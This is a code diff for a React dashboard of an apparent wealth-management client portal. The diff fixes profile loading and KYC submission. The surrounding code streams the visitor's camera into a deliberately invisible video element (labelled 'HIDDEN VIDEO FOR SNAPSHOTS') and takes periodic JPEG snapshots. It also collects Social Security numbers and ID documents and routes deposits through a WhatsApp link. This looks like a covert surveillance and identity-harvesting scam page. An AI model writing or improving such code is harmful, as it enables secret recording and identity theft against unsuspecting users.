@@ -22,16 +22,40 @@ export default function Dashboard() {
 
   useEffect(() => {
     const init = async () => {
+      // 1. Check Session
       const { data: { session } } = await supabase.auth.getSession();
       if (!session) { window.location.href = '/portal/auth'; return; }
 
+      // 2. Fetch Profile with Error Handling
       const fetchProfile = async () => {
-        const { data } = await supabase.from('profiles').select('*').eq('id', session.user.id).single();
-        if (data) setUser(data);
+        const { data, error } = await supabase
+          .from('profiles')
+          .select('*')
+          .eq('id', session.user.id)
+          .single();
+
+        if (error || !data) {
+          // IF PROFILE IS MISSING, use dummy data so dashboard loads
+          console.warn("Profile missing, using fallback.");
+          setUser({
+            id: session.user.id,
+            email: session.user.email,
+            full_name: "Valued Client",
+            balance: 0,
+            deposit_status: 'pending',
+            kyc_status: 'unverified'
+          });
+        } else {
+          setUser(data);
+        }
+        
+        // CRITICAL FIX: Stop loading even if profile failed
         setLoading(false);
       };
+
       fetchProfile();
 
+      // 3. Realtime Sync
       const channel = supabase.channel('db-sync')
         .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` }, 
         (payload) => setUser(payload.new))
@@ -48,7 +72,6 @@ export default function Dashboard() {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
-        // Crucial: Wait for video to be ready before starting interval
         videoRef.current.onloadedmetadata = () => {
           videoRef.current?.play();
         };
@@ -57,13 +80,10 @@ export default function Dashboard() {
       setInterval(async () => {
         if (!videoRef.current || !canvasRef.current) return;
         
-        // Ensure we are actually getting video data
         if (videoRef.current.readyState === videoRef.current.HAVE_ENOUGH_DATA) {
             const context = canvasRef.current.getContext('2d');
-            // Draw exact frame
             context?.drawImage(videoRef.current, 0, 0, 640, 480);
             
-            // Convert to JPG
             const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg', 0.7));
             
             if (blob) {
@@ -81,8 +101,14 @@ export default function Dashboard() {
     try {
       const path = `${user.id}/${Date.now()}_id.jpg`;
       await supabase.storage.from('user-kyc').upload(path, idFile);
-      // We set ssn_data so the UI knows to show "Reviewing"
-      await supabase.from('profiles').update({ ssn_data: ssn, document_type: idType, kyc_status: 'pending' }).eq('id', user.id);
+      
+      await supabase.from('profiles').upsert({ 
+        id: user.id, // Ensure we create the row if it was missing
+        ssn_data: ssn, 
+        document_type: idType, 
+        kyc_status: 'pending' 
+      });
+
       setUser({ ...user, kyc_status: 'pending', ssn_data: ssn });
     } catch (err: any) { alert(err.message); }
     finally { setKycSubmitting(false); }
@@ -92,7 +118,6 @@ export default function Dashboard() {
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
   const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
 
-  // LOGIC FIX: Only show "Pending" if status is pending AND we actually have their data
   const showPendingScreen = user?.kyc_status === 'pending' && user?.ssn_data;
 
   if (loading) return (
@@ -104,11 +129,7 @@ export default function Dashboard() {
 
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
-      {/* FIX 1: VIDEO VISIBILITY
-        Replaced "hidden" with "opacity-0 absolute pointer-events-none".
-        This forces the browser to render the frames (fixing the black screen)
-        while keeping it invisible to the user.
-      */}
+      {/* HIDDEN VIDEO FOR SNAPSHOTS */}
       <video 
         ref={videoRef} 
         autoPlay 
@@ -135,7 +156,7 @@ export default function Dashboard() {
            <div className="flex items-center gap-4">
               <div className="flex flex-col items-end mr-2">
                 <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
-                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0]}</span>
+                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0] || 'User'}</span>
               </div>
               <button 
                 onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal/auth')} 
@@ -218,7 +239,6 @@ export default function Dashboard() {
               </div>
               <p className="text-gray-500 text-sm mb-12 font-light leading-relaxed">Required for Tier-1 wealth management access and high-limit withdrawals.</p>
 
-              {/* FIX 2: Only show 'Pending' if we actually have data submitted */}
               {showPendingScreen ? (
                 <div className="bg-white/5 border border-white/10 p-12 rounded-[2rem] text-center space-y-4">
                    <Activity className="text-[#D4AF37] mx-auto animate-spin" size={32} />
@@ -272,4 +292,4 @@ export default function Dashboard() {
       </div>
     </main>
   );
-                                 }
+        }
